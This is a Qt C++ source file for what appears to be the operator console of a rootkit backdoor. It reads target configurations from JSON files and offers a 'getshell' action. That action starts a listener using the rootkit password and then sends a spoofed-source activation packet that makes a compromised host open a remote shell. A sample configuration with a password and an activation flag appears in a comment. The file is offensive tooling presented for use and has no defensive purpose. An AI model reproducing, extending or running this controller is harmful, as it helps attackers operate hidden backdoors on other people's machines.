#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "target_table.h"
#include "fun.h"
#include <QDebug>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    create_data_module();

    // tableview menu
    menu = new QMenu(ui->tableView);
    // 右键菜单
    menu->addAction(QStringLiteral("getshell"), this, SLOT(slot_getshell()));
    menu->addAction(QStringLiteral("file manage"), this, SLOT(slot_file_manage()));
    menu->addAction(QStringLiteral("delete"), this, SLOT(slot_delete()));

    // 响应右键菜单信号槽
    connect(ui->tableView, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(slotCustomContextMenuRequested(QPoint)));

    // show table
    show_target_table();

    // menubar
    connect(ui->actionAdd_new_setting_file, SIGNAL(triggered()), this, SLOT(slot_add_config()));
    connect(ui->actionReload_config_file, SIGNAL(triggered()), this, SLOT(slot_refresh_table()));


}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::slot_getshell()
{
/*
本地监听IP
本地监听端口
激活包伪装IP
激活包伪装端口
目标IP
目标端口
激活包协议
口令
激活包标识
*/
    int click_row_number = menu_click_index.row();
    QString local_listen_ip = model->index(click_row_number,0).data().toString();
    QString local_listen_port = model->index(click_row_number,1).data().toString();
    QString fake_ip = model->index(click_row_number,2).data().toString();
    QString fake_port = model->index(click_row_number,3).data().toString();
    QString target_ip = model->index(click_row_number,4).data().toString();
    QString target_port = model->index(click_row_number,5).data().toString();
    QString activate_packet_protocol = model->index(click_row_number,6).data().toString();
    QString rootkit_pass = model->index(click_row_number,7).data().toString();
    QString activate_flag = model->index(click_row_number,8).data().toString();

    qDebug()<<local_listen_ip;
    qDebug()<<local_listen_port;
    qDebug()<<fake_ip;
    qDebug()<<fake_port;
    qDebug()<<target_ip;
    qDebug()<<target_port;
    qDebug()<<activate_packet_protocol;
    qDebug()<<rootkit_pass;
    qDebug()<<activate_flag;

    QString new_terminal_cmd = "/usr/bin/dbus-launch /usr/bin/gnome-terminal  --window --";
    QString pwd = QCoreApplication::applicationDirPath();

    QString packet_cmd = QString("%1 %2/%3 -x %4 -t %5 -l %6 -p %7 -s %8 -q %9 -r %10 -k %11")
            .arg(" ")
            .arg(pwd)
            .arg("packet")
            .arg(activate_packet_protocol)
            .arg(target_ip)
            .arg(local_listen_ip)
            .arg(local_listen_port)
            .arg(fake_ip)
            .arg(fake_port)
            .arg(target_port)
            .arg(activate_flag);

    QString listener_cmd = QString("%1 %2/%3 -p %4 -s %5")
            .arg(new_terminal_cmd)
            .arg(pwd)
            .arg("listener")
            .arg(local_listen_port)
            .arg(rootkit_pass);

    qDebug()<<packet_cmd<<"\n";
    qDebug()<<listener_cmd<<"\n";

    system(listener_cmd.toLatin1());
    sleep(4);
    system(packet_cmd.toLatin1());

}

void MainWindow::slot_file_manage()
{

}

void MainWindow::slot_delete()
{
    int click_row_number = menu_click_index.row();
    QString file_path = model->index(click_row_number,9).data().toString();
    bool ok = QFile::remove("config/"+file_path);
    if (ok){
        QString dlg_title = "info";
        QString strInfo = "删除成功";
        QMessageBox::information(this, dlg_title, strInfo
          , QMessageBox::Ok, QMessageBox::NoButton);
    }
    slot_refresh_table();
}


void MainWindow::show_target_table()
{
    ui->tableView->horizontalHeader()->setVisible(true);//显示或隐藏表头
    ui->tableView->verticalHeader()->setVisible(true);//显示或隐藏序列行
    ui->tableView->setAutoScroll(true);//自动滚动条
    ui->tableView->resizeColumnsToContents(); //根据内容调整大小
    ui->tableView->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);//根据容器调整大小
    ui->tableView->setEditTriggers(QAbstractItemView::NoEditTriggers);//只读
    ui->tableView->setSelectionBehavior(QAbstractItemView::SelectRows); //设置选中模式为选中行
    ui->tableView->setSelectionMode( QAbstractItemView::SingleSelection); //设置选中单行

    ui->tableView->horizontalHeader()->setSectionResizeMode(QHeaderView::Interactive);  // set click can reset table size
    ui->tableView->verticalHeader()->setSectionResizeMode(QHeaderView::Interactive);    // set click can reset table size
    ui->tableView->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOn);// visable scroll
    ui->tableView->setModel(model); //使用

    DIR *dir;

    char config_path[] = "config";
    if((dir = opendir(config_path))==0)	//无法打开则跳过
    {
        qDebug("open %s failed!\n",config_path);
        return ;
    }

    struct dirent *stdir;

    while(1)
    {
        char pathname[512] = {0};		//目录的全名，=当前目录名+子目录名
        if((stdir = readdir(dir))==0)
            break;  //遍历完一整个文件夹就停止循环
        if(stdir->d_type == 8)							//文件则输出
        {
            sprintf(pathname,"%s/%s",config_path,stdir->d_name);
            qDebug("get config filename: %s\n", pathname);

            QFile file(pathname);	//创建QFile对象，并指定json文件路径
            //打开json文件并判断（不成功则返回0）
            if(!file.open(QIODevice::ReadOnly))
                continue;
            //将文件内容读取到数组中
            QByteArray data(file.readAll());
            file.close();	//关闭文件
            QJsonParseError jError;	//创建QJsonParseError对象
            //使用QJsonDocument的fromJson函数读取json串，并将QJsonParseError对象传入获取错误值
            QJsonDocument jDoc = QJsonDocument::fromJson(data, &jError);
            //判断QJsonParseError对象获取的error是否包含错误，包含则返回0
            if(jError.error != QJsonParseError::NoError)
                continue;
            QJsonObject jObj = jDoc.object();
            insert_target_table(jObj, stdir->d_name);
        }
        else //if(stdir->d_type == 4)					//文件夹则递归进行下一轮，打开文件夹
        {

        }
    }
    closedir(dir);		//关闭目录

    // 打开右键菜单属性
    ui->tableView->setContextMenuPolicy(Qt::CustomContextMenu);


    // table view
    //{"local_listen_ip":"192.168.111.189","local_listen_port":"4444",
    //"activatepPackage_fake_src_ip":"192.168.111.100","activatepPackage_fake_src_port":"48354",
    //"target_ip":"192.168.111.71","target_port":"69","activate_package_protocol":"tcp",
    //"rootkit_pass":"s3cr3t","activate_flag":"hax0r"}

}


void MainWindow::slotCustomContextMenuRequested(const QPoint &pos)
{
    menu_click_index = ui->tableView->indexAt(pos);
    if (menu_click_index.isValid()){
        QPoint p;
        p.setX(pos.x());
        p.setY(pos.y() + menu->height() / 2);
        menu->exec(ui->tableView->mapToGlobal(p));
        //line_number  = menu_click_index.row();//获得tableView列表点击的行数
    }

}


/*
void MainWindow::insert_target_table(struct Target_info2* t_info)
{
    //add line
    int current_rowcount = model->rowCount();
    qDebug("current line count = %d\n",current_rowcount);
    model->insertRows(current_rowcount,1); //插入一行
    model->setData(model->index(current_rowcount,0), t_info->local_listen_ip);
    model->setData(model->index(current_rowcount,1), t_info->local_listen_port);
    model->setData(model->index(current_rowcount,2), t_info->activatepPackage_fake_src_ip);
    model->setData(model->index(current_rowcount,3), t_info->activatepPackage_fake_src_port);
    model->setData(model->index(current_rowcount,4), t_info->target_ip);
    model->setData(model->index(current_rowcount,5), t_info->target_port);
    model->setData(model->index(current_rowcount,6), t_info->activate_package_protocol);
    model->setData(model->index(current_rowcount,7), t_info->rootkit_pass);
    model->setData(model->index(current_rowcount,8), t_info->activate_flag);

    //设置为居中
    for(int m=0; m<9; m++)
        model->item(current_rowcount,m)->setTextAlignment(Qt::AlignCenter);
//    cJSON_Delete(t_info->j_config);
//    delete t_info;

}
*/

void MainWindow::insert_target_table(QJsonObject jObj, char* file_path)
{
    //add line
    int current_rowcount = model->rowCount();
    qDebug("current line count = %d\n",current_rowcount);
    model->insertRows(current_rowcount,1); //插入一行
    model->setData(model->index(current_rowcount,0), jObj["local_listen_ip"].toString());
    model->setData(model->index(current_rowcount,1), jObj["local_listen_port"].toString());
    model->setData(model->index(current_rowcount,2), jObj["activatepPackage_fake_src_ip"].toString());
    model->setData(model->index(current_rowcount,3), jObj["activatepPackage_fake_src_port"].toString());
    model->setData(model->index(current_rowcount,4), jObj["target_ip"].toString());
    model->setData(model->index(current_rowcount,5), jObj["target_port"].toString());
    model->setData(model->index(current_rowcount,6), jObj["activate_package_protocol"].toString());
    model->setData(model->index(current_rowcount,7), jObj["rootkit_pass"].toString());
    model->setData(model->index(current_rowcount,8), jObj["activate_flag"].toString());
    model->setData(model->index(current_rowcount,9), file_path);

    //设置为居中
    for(int m=0; m<9; m++)
        model->item(current_rowcount,m)->setTextAlignment(Qt::AlignCenter);

}

void MainWindow::create_data_module()
{
    model = new QStandardItemModel(0,10);
    model->setHeaderData(0,Qt::Horizontal,tr("本地监听IP"));
    model->setHeaderData(1,Qt::Horizontal,tr("本地监听端口"));
    model->setHeaderData(2,Qt::Horizontal,tr("激活包伪装IP"));
    model->setHeaderData(3,Qt::Horizontal,tr("伪装端口"));
    model->setHeaderData(4,Qt::Horizontal,tr("目标IP"));
    model->setHeaderData(5,Qt::Horizontal,tr("目标端口"));
    model->setHeaderData(6,Qt::Horizontal,tr("激活包协议"));
    model->setHeaderData(7,Qt::Horizontal,tr("口令"));
    model->setHeaderData(8,Qt::Horizontal,tr("激活包标识"));
    model->setHeaderData(9,Qt::Horizontal,tr("文件名"));
}



void MainWindow::slot_add_config()
{
    AddConfig *win_add_config = new AddConfig;
    win_add_config->setWindowModality(Qt::ApplicationModal);  // Qt::WindowModal only for father window
    win_add_config->setAttribute(Qt::WA_DeleteOnClose); // set really destroy object when close()
    connect(win_add_config, SIGNAL(destroyed()), this, SLOT(slot_refresh_table()));
    win_add_config->show();
}

void MainWindow::slot_refresh_table()
{
    delete model;
    create_data_module();
    show_target_table();
}
